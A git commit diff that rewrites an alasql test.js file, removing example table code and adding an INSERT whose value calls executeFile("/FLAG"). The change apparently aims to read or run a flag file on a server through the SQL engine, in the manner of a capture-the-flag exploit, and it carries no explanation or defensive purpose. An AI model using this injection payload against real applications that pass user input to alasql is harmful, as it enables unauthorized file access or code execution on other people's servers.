7d1681a38c29875e425d4ca270f9d36df8f6bc5e
vr2 <hydw9898@gmail.com>
2024-11-15 09:46:24 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,10 +1,5 @@
-alasql('CREATE TABLE example2 (a INT, b INT)');
-
-// alasql's data store for a table can be assigned directly
-alasql.tables.example2.data = [
-    {a:2,b:6},
-    {a:3,b:4}
+alasql('CREATE TABLE genie (content TEXT)');
+alasql.tables.genie.data = [
+    {content:"test"}
 ];
-
-alasql('INSERT INTO example2 VALUES (1,5)');
-
+alasql('INSERT INTO genie VALUES (executeFile("/FLAG"))');
